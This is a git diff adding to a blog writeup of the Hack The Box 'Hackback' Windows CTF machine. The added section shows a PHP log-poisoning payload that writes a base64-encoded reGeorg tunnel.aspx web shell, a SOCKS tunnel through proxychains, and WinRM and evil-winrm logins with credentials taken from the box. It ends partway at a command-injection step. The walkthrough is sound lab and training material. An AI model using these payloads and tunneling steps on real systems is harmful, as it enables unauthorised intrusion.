@@ -98,7 +98,7 @@ If you find anything in this writeup you feel is inaccurately depicted and/or ex
 
 ### Overview
 
-The `Hackback` machine on Hack The Box (created by <a href="https://www.hackthebox.eu/home/users/profile/1391">decoder</a> and <a href="https://www.hackthebox.eu/home/users/profile/12438">yuntao</a>) is a retired 50 point Windows machine. This machine is incredibly difficult; so difficult that it maintained a 9.4/10 difficulty rating for almost a week upon being released. The initial steps involve locating a GoPhish website where default credentials are used to login. There are also some vhosts which lead to a hidden administration link within some obfuscated JavaScript code. Next, the parameters of a web admin page can be fuzzed to determine its log files are SHA-256 checksums of connecting IP addresses. Log poisoning is then performed to gain read/write access. A file called `web.config.old` is extracted from the web server and contains credentials for the user `simple`. A reGeorg aspx tunnel is then utilized to connect to the remote machine. This enables tunneling via a SOCKS proxy with WinRM and the credentials found for `simple` in `web.config.old`. A command injection vulnerability in a powershell script called `dellog.ps1` can be leveraged in association with a `clean.ini` file to escalate to the user `hacker`. Once escalated, the user `hacker` can start/stop a suspicious service called `UserLogger`, which accepts an argument. This can be abused to escalate folder path permissions. Finally, `root.txt` can be viewed by reading an alternate data stream (ADS).
+The `Hackback` machine on Hack The Box (created by <a href="https://www.hackthebox.eu/home/users/profile/1391">decoder</a> and <a href="https://www.hackthebox.eu/home/users/profile/12438">yuntao</a>) is a retired 50 point Windows machine. This machine is incredibly difficult; so difficult that it maintained a 9.4/10 difficulty rating for almost a week upon being released. The initial steps involve locating a GoPhish website where default credentials are used to login. There are also some virtual hosts which lead to a hidden administration link within some obfuscated JavaScript code. Next, the parameters of a web admin page can be fuzzed to determine its log files are SHA-256 checksums of connecting IP addresses. Log poisoning is then performed to gain read/write access. A file called `web.config.old` is extracted from the web server and contains credentials for the user `simple`. A reGeorg aspx tunnel is then utilized to connect to the remote machine. This enables tunneling via a SOCKS proxy with WinRM and the credentials found for `simple` in `web.config.old`. A command injection vulnerability in a powershell script called `dellog.ps1` can be leveraged in association with a `clean.ini` file to escalate to the user `hacker`. Once escalated, the user `hacker` can start/stop a suspicious service called `UserLogger`, which accepts an argument. This can be abused to escalate folder path permissions. Finally, `root.txt` can be viewed by reading an alternate data stream (ADS).
 
 <p><br></p>
 
@@ -677,6 +677,204 @@ I wasn't able to use the credentials yet, but I had a feeling they might come in
 ### Tunneling with reGeorg
 
 Armed with the ability to write files to the system via PHP log poisoning, and considering I still didn't have access to any `shell_exec` or `exec` functions in general, I decided to utilize <a href="https://github.com/sensepost/reGeorg">reGeorg</a> for pivoting. This tool enabled me to create a local SOCKS proxy bound to a remote `.aspx` file running on the target machine.
+<p><br></p>
+
+I had initially tried to upload a bind shell, but wasn't able to get it working properly. Either way, to get `reGeorg` running I first had to upload the `tunnel.aspx` file that can be found in the `reGeorg` GitHub repository. I used a simple `file_put_contents()` command with the PHP injection to do this.
+<p><br></p>
+
+This was my final PHP payload for sending the `tunnel.aspx` file. The base64 included is the contents of the `tunnel.aspx` file piped to `base64`:
+
+```bash
+<?php file_put_contents("tunnel.aspx",base64_decode("PCVAIFBhZ2UgTGFuZ3VhZ2U9IkMjIiBFbmFibGVTZXNzaW9uU3RhdGU9IlRydWUiJT4KPCVAIEltcG9ydCBOYW1lc3BhY2U9IlN5c3RlbS5OZXQiICU+CjwlQCBJbXBvcnQgTmFtZXNwYWNlPSJTeXN0ZW0uTmV0LlNvY2tldHMiICU+CjwlCi8qICAgICAgICAgICAgICAgICAgIF9fX19fICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgX19fX18gICBfX19fX18gIF9ffF9fXyAgfF9fICBfX19fX18gIF9fX19fICBfX19fXyAgIF9fX19fXyAgCiB8ICAgICB8IHwgICBfX198fCAgIF9fX3wgICAgfHwgICBfX198LyAgICAgXHwgICAgIHwgfCAgIF9fX3wgCiB8ICAgICBcIHwgICBfX198fCAgIHwgIHwgICAgfHwgICBfX198fCAgICAgfHwgICAgIFwgfCAgIHwgIHwgCiB8X198XF9fXHxfX19fX198fF9fX19fX3wgIF9ffHxfX19fX198XF9fX19fL3xfX3xcX19cfF9fX19fX3wgCiAgICAgICAgICAgICAgICAgICAgfF9fX19ffAogICAgICAgICAgICAgICAgICAgIC4uLiBldmVyeSBvZmZpY2UgbmVlZHMgYSB0b29sIGxpa2UgR2VvcmcKICAgICAgICAgICAgICAgICAgICAKICB3aWxsZW1Ac2Vuc2Vwb3N0LmNvbSAvIEBfd19tX18KICBzYW1Ac2Vuc2Vwb3N0LmNvbSAvIEB0cm93YWx0cwogIGV0aWVubmVAc2Vuc2Vwb3N0LmNvbSAvIEBrYW1wX3N0YWFsZHJhYWQKCkxlZ2FsIERpc2NsYWltZXIKVXNhZ2Ugb2YgcmVHZW9yZyBmb3IgYXR0YWNraW5nIG5ldHdvcmtzIHdpdGhvdXQgY29uc2VudApjYW4gYmUgY29uc2lkZXJlZCBhcyBpbGxlZ2FsIGFjdGl2aXR5LiBUaGUgYXV0aG9ycyBvZgpyZUdlb3JnIGFzc3VtZSBubyBsaWFiaWxpdHkgb3IgcmVzcG9uc2liaWxpdHkgZm9yIGFueQptaXN1c2Ugb3IgZGFtYWdlIGNhdXNlZCBieSB0aGlzIHByb2dyYW0uCgpJZiB5b3UgZmluZCByZUdlb3JnZSBvbiBvbmUgb2YgeW91ciBzZXJ2ZXJzIHlvdSBzaG91bGQKY29uc2lkZXIgdGhlIHNlcnZlciBjb21wcm9taXNlZCBhbmQgbGlrZWx5IGZ1cnRoZXIgY29tcHJvbWlzZQp0byBleGlzdCB3aXRoaW4geW91ciBpbnRlcm5hbCBuZXR3b3JrLgoKRm9yIG1vcmUgaW5mb3JtYXRpb24sIHNlZToKaHR0cHM6Ly9naXRodWIuY29tL3NlbnNlcG9zdC9yZUdlb3JnCiovCiAgICB0cnkKICAgIHsKICAgICAgICBpZiAoUmVxdWVzdC5IdHRwTWV0aG9kID09ICJQT1NUIikKICAgICAgICB7CiAgICAgICAgICAgIC8vU3RyaW5nIGNtZCA9IFJlcXVlc3QuSGVhZGVycy5HZXQoIlgtQ01EIik7CiAgICAgICAgICAgIFN0cmluZyBjbWQgPSBSZXF1ZXN0LlF1ZXJ5U3RyaW5nLkdldCgiY21kIikuVG9VcHBlcigpOwogICAgICAgICAgICBpZiAoY21kID09ICJDT05ORUNUIikKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgdHJ5CiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgU3RyaW5nIHRhcmdldCA9IFJlcXVlc3QuUXVlcnlTdHJpbmcuR2V0KCJ0YXJnZXQiKS5Ub1VwcGVyKCk7CiAgICAgICAgICAgICAgICAgICAgLy9SZXF1ZXN0LkhlYWRlcnMuR2V0KCJYLVRBUkdFVCIpOwogICAgICAgICAgICAgICAgICAgIGludCBwb3J0ID0gaW50LlBhcnNlKFJlcXVlc3QuUXVlcnlTdHJpbmcuR2V0KCJwb3J0IikpOwogICAgICAgICAgICAgICAgICAgIC8vUmVxdWVzdC5IZWFkZXJzLkdldCgiWC1QT1JUIikpOwogICAgICAgICAgICAgICAgICAgIElQQWRkcmVzcyBpcCA9IElQQWRkcmVzcy5QYXJzZSh0YXJnZXQpOwogICAgICAgICAgICAgICAgICAgIFN5c3RlbS5OZXQuSVBFbmRQb2ludCByZW1vdGVFUCA9IG5ldyBJUEVuZFBvaW50KGlwLCBwb3J0KTsKICAgICAgICAgICAgICAgICAgICBTb2NrZXQgc2VuZGVyID0gbmV3IFNvY2tldChBZGRyZXNzRmFtaWx5LkludGVyTmV0d29yaywgU29ja2V0VHlwZS5TdHJlYW0sIFByb3RvY29sVHlwZS5UY3ApOwogICAgICAgICAgICAgICAgICAgIHNlbmRlci5Db25uZWN0KHJlbW90ZUVQKTsKICAgICAgICAgICAgICAgICAgICBzZW5kZXIuQmxvY2tpbmcgPSBmYWxzZTsKICAgICAgICAgICAgICAgICAgICBTZXNzaW9uLkFkZCgic29ja2V0Iiwgc2VuZGVyKTsKICAgICAgICAgICAgICAgICAgICBSZXNwb25zZS5BZGRIZWFkZXIoIlgtU1RBVFVTIiwgIk9LIik7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBjYXRjaCAoRXhjZXB0aW9uIGV4KQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1FUlJPUiIsIGV4Lk1lc3NhZ2UpOwogICAgICAgICAgICAgICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1TVEFUVVMiLCAiRkFJTCIpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgaWYgKGNtZCA9PSAiRElTQ09OTkVDVCIpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgU29ja2V0IHMgPSAoU29ja2V0KVNlc3Npb25bInNvY2tldCJdOwogICAgICAgICAgICAgICAgICAgIHMuQ2xvc2UoKTsKICAgICAgICAgICAgICAgIH0gY2F0Y2ggKEV4Y2VwdGlvbiBleCl7CgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgU2Vzc2lvbi5BYmFuZG9uKCk7CiAgICAgICAgICAgICAgICBSZXNwb25zZS5BZGRIZWFkZXIoIlgtU1RBVFVTIiwgIk9LIik7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSBpZiAoY21kID09ICJGT1JXQVJEIikKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgU29ja2V0IHMgPSAoU29ja2V0KVNlc3Npb25bInNvY2tldCJdOwogICAgICAgICAgICAgICAgdHJ5CiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgaW50IGJ1ZmZMZW4gPSBSZXF1ZXN0LkNvbnRlbnRMZW5ndGg7CiAgICAgICAgICAgICAgICAgICAgYnl0ZVtdIGJ1ZmYgPSBuZXcgYnl0ZVtidWZmTGVuXTsKICAgICAgICAgICAgICAgICAgICBpbnQgYyA9IDA7CiAgICAgICAgICAgICAgICAgICAgd2hpbGUgKChjID0gUmVxdWVzdC5JbnB1dFN0cmVhbS5SZWFkKGJ1ZmYsIDAsIGJ1ZmYuTGVuZ3RoKSkgPiAwKQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgcy5TZW5kKGJ1ZmYpOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBSZXNwb25zZS5BZGRIZWFkZXIoIlgtU1RBVFVTIiwgIk9LIik7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBjYXRjaCAoRXhjZXB0aW9uIGV4KQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1FUlJPUiIsIGV4Lk1lc3NhZ2UpOwogICAgICAgICAgICAgICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1TVEFUVVMiLCAiRkFJTCIpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgaWYgKGNtZCA9PSAiUkVBRCIpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFNvY2tldCBzID0gKFNvY2tldClTZXNzaW9uWyJzb2NrZXQiXTsKICAgICAgICAgICAgICAgIHRyeQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIGludCBjID0gMDsKICAgICAgICAgICAgICAgICAgICBieXRlW10gcmVhZEJ1ZmYgPSBuZXcgYnl0ZVs1MTJdOwogICAgICAgICAgICAgICAgICAgIHRyeQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgd2hpbGUgKChjID0gcy5SZWNlaXZlKHJlYWRCdWZmKSkgPiAwKQogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBieXRlW10gbmV3QnVmZiA9IG5ldyBieXRlW2NdOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgLy9BcnJheS5Db25zdHJhaW5lZENvcHkocmVhZEJ1ZmYsIDAsIG5ld0J1ZmYsIDAsIGMpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgU3lzdGVtLkJ1ZmZlci5CbG9ja0NvcHkocmVhZEJ1ZmYsIDAsIG5ld0J1ZmYsIDAsIGMpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgUmVzcG9uc2UuQmluYXJ5V3JpdGUobmV3QnVmZik7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgUmVzcG9uc2UuQWRkSGVhZGVyKCJYLVNUQVRVUyIsICJPSyIpOwogICAgICAgICAgICAgICAgICAgIH0gICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGNhdGNoIChTb2NrZXRFeGNlcHRpb24gc29leCkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1TVEFUVVMiLCAiT0siKTsKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGNhdGNoIChFeGNlcHRpb24gZXgpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgUmVzcG9uc2UuQWRkSGVhZGVyKCJYLUVSUk9SIiwgZXguTWVzc2FnZSk7CiAgICAgICAgICAgICAgICAgICAgUmVzcG9uc2UuQWRkSGVhZGVyKCJYLVNUQVRVUyIsICJGQUlMIik7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0gCiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgUmVzcG9uc2UuV3JpdGUoIkdlb3JnIHNheXMsICdBbGwgc2VlbXMgZmluZSciKTsKICAgICAgICB9CiAgICB9CiAgICBjYXRjaCAoRXhjZXB0aW9uIGV4S2FrKQogICAgewogICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1FUlJPUiIsIGV4S2FrLk1lc3NhZ2UpOwogICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1TVEFUVVMiLCAiRkFJTCIpOwogICAgfQolPgoK")); echo 'everything is probably fine...'?>
+```
+The output appeared to be normal when checking the logs as well:
+```bash
+[16 April 2020, 07:12:33 PM] 10.10.14.37 - Username: everything is probably fine...?, Password: 4everything is probably fine...?
+```
+I then started up the local instance of `reGeorg` after configuring `proxychains` to utilize port `1337` for the connection:
+
+```bash
+➜  HACKBACK vim /etc/proxychains.conf
+
+[ProxyList]
+# add proxy here ...
+# meanwile
+# defaults set to "tor"
+socks4	127.0.0.1 1337
+```
+
+```bash
+➜  reGeorg git:(master) python reGeorgSocksProxy.py -l 127.0.0.1 -p 1337 -u http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/tunnel.aspx
+
+    
+                     _____
+  _____   ______  __|___  |__  ______  _____  _____   ______
+ |     | |   ___||   ___|    ||   ___|/     \|     | |   ___|
+ |     \ |   ___||   |  |    ||   ___||     ||     \ |   |  |
+ |__|\__\|______||______|  __||______|\_____/|__|\__\|______|
+                    |_____|
+                    ... every office needs a tool like Georg
+
+  willem@sensepost.com / @_w_m__
+  sam@sensepost.com / @trowalts
+  etienne@sensepost.com / @kamp_staaldraad
+  
+   
+[INFO   ]  Log Level set to [INFO]
+[INFO   ]  Starting socks server [127.0.0.1:1337], tunnel at [http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/tunnel.aspx]
+[INFO   ]  Checking if Georg is ready
+[INFO   ]  Georg says, 'All seems fine'
+```
+
+Just to verify...
+
+<img src="/assets/img/writeups/HTB-HACKBACK/HACKBACK-REGEORG-VERIFY.PNG" class="hackback-img" alt="Hackback - reGeorg Connected">
+
+Nice. Now that I had my tunnel working, I went ahead and added the credentials I found earlier to a Windows Remote Management connection script called <a href="https://github.com/Alamot/code-snippets/blob/master/winrm/winrm_shell.rb">winrm_shell.rb</a>, created by a fellow Hack The Box member named <a href="https://www.hackthebox.eu/home/users/profile/179">alamot</a> (tied in with proxychains, of course). I was able to clone the script to `/opt` and run it according to the syntax provided in its usage menu.
+
+```ruby
+#!/usr/bin/ruby
+require 'winrm'
+
+# Author: Alamot
+
+conn = WinRM::Connection.new( 
+  endpoint: 'http://10.10.10.128:5985/wsman',
+  transport: :ssl,
+  user: 'simple',
+  password: 'ZonoProprioZomaro:-(',
+  :no_ssl_peer_verification => true
+)
+
+command=""
+
+conn.shell(:powershell) do |shell|
+    until command == "exit\n" do
+        output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')")
+        print(output.output.chomp)
+        command = STDIN.gets        
+        output = shell.run(command) do |stdout, stderr|
+            STDOUT.print stdout
+            STDERR.print stderr
+        end
+    end    
+    puts "Exiting with code #{output.exitcode}"
+end
+```
+
+Once I had the necessary information adjusted, I gave it a try.
+
+<img src="/assets/img/writeups/HTB-HACKBACK/HACKBACK-WINRM-CONNECT.PNG" class="hackback-img" alt="Hackback - WinRM Connected">
+
+Woohoo! I finally managed to connect as `simple`. However, after checking out the directories, there still didn't appear to be a `user.txt` file...
+
+```bash
+PS hackback\simple@HACKBACK Desktop> dir -h
+
+    Directory: C:\Users\simple\Desktop
+
+Mode                LastWriteTime         Length Name                                                                                                                                                                                                    
+----                -------------         ------ ----                                                                                                                                                                                                    
+-a-hs-       12/21/2018   6:20 AM            282 desktop.ini                                                                                                                                                                                          
+PS hackback\simple@HACKBACK Desktop> type desktop.ini
+
+[.ShellClassInfo]
+LocalizedResourceName=@%SystemRoot%\system32\shell32.dll,-21769
+IconResource=%SystemRoot%\system32\imageres.dll,-183
+```
+
+### Privilege Escalation & Obtaining user.txt
+
+Enumeration was pretty annoying at this point, especially since my WinRM shell was already a bit slow while running through the `reGeorg` tunnel. Upon traversing to `C:\` however, I located an interesting hidden directory in `util` called `scripts`.
+
+```bash
+PS hackback\simple@HACKBACK C:\> cd util
+PS hackback\simple@HACKBACK util> dir -h
+
+
+    Directory: C:\util
+
+
+Mode                LastWriteTime         Length Name                                                                                                                                                                                                    
+----                -------------         ------ ----                                                                                                                                                                                                    
+d--h--       12/21/2018   6:21 AM                scripts
+```
+
+Checking permissions on the directory, I noticed it is owned by a user called `hacker`.
+
+```bash
+PS hackback\simple@HACKBACK > Get-Acl | fl
+
+
+Path   : Microsoft.PowerShell.Core\FileSystem::C:\util\scripts
+Owner  : HACKBACK\hacker
+Group  : HACKBACK\None
+Access : CREATOR OWNER Allow  FullControl
+         NT AUTHORITY\SYSTEM Allow  FullControl
+         BUILTIN\Administrators Allow  FullControl
+         HACKBACK\simple Allow  ReadAndExecute, Synchronize
+         HACKBACK\hacker Allow  Modify, Synchronize
+         HACKBACK\hacker Allow  FullControl
+```
+
+After entering the `scripts` directory, I discovered a file called `clean.ini`. The contents of the `clean.ini` file were as follows:
+
+```bash
+PS hackback\simple@HACKBACK > type clean.ini
+[Main] 
+LifeTime=100 
+LogFile=c:\util\scripts\log.txt
+Directory=c:\inetpub\logs\logfiles
+```
+
+Since the file appeared to deal with logs, I was naturally interested in the `powershell` script called `dellog.ps1`, also located in the `scripts` directory. I attempted to read the contents of the `dellog.ps1` file as a result.
+
+```bash
+PS hackback\simple@HACKBACK > type dellog.ps1
+Access to the path 'C:\util\scripts\dellog.ps1' is denied.
+```
+
+But, I was promptly denied...
+<p><br></p>
+
+At this point, all hope seemed lost... That is, until I realized `simple` was a member of the `project-managers` group – a group which was able to write to the `clean.ini` file.
+
+```bash
+PS hackback\simple@HACKBACK > whoami /groups
+
+GROUP INFORMATION
+-----------------
+
+Group Name                           Type             SID                                           Attributes                                        
+==================================== ================ ============================================= ==================================================
+Everyone                             Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
+HACKBACK\project-managers            Alias            S-1-5-21-2115913093-551423064-1540603852-1005 Mandatory group, Enabled by default, Enabled group
+```
+
+I was able to verify this using `icacls`:
+
+```bash
+PS hackback\simple@HACKBACK > icacls clean.ini
+clean.ini NT AUTHORITY\SYSTEM:(F)
+          BUILTIN\Administrators:(F)
+          HACKBACK\project-managers:(M)
+```
+At this point, a teammate of mine discovered the `LogFile` parameter in the `clean.ini` file was vulnerable to command injection. The `powershell` script called `dellog.ps1` was used to wipe the log file, but used the `LogFile` parameter to pipe output. This leaves it vulnerable to arbitrary command injection after writing.
+
+At this point, the `winrm` shell by `alamot` was running a bit too slow for my taste, so I upgraded to an <a href="https://github.com/Hackplayers/evil-winrm">evil-winrm</a> shell instead. This shell is created by another fellow Hack The Box member, and offers upload/download capabilities as well as some other cool usability features.
+
+```bash
+➜  HACKBACK proxychains evil-winrm -u simple -p 'ZonoProprioZomaro:-(' -i 127.0.0.1
+ProxyChains-3.1 (http://proxychains.sf.net)
+
+Evil-WinRM shell v2.0
+
+Info: Establishing connection to remote endpoint
+
++*Evil-WinRM* PS C:\Users\simple\Documents>
+```
+
+Equipped with my new and improved shell, I tried to upload `nc.exe` to the machine in an attempt to abuse the aforementioned command injection vulnerability in the `clean.ini` file. 
 
 ### Writeup still in progress... Check back later for more!
 
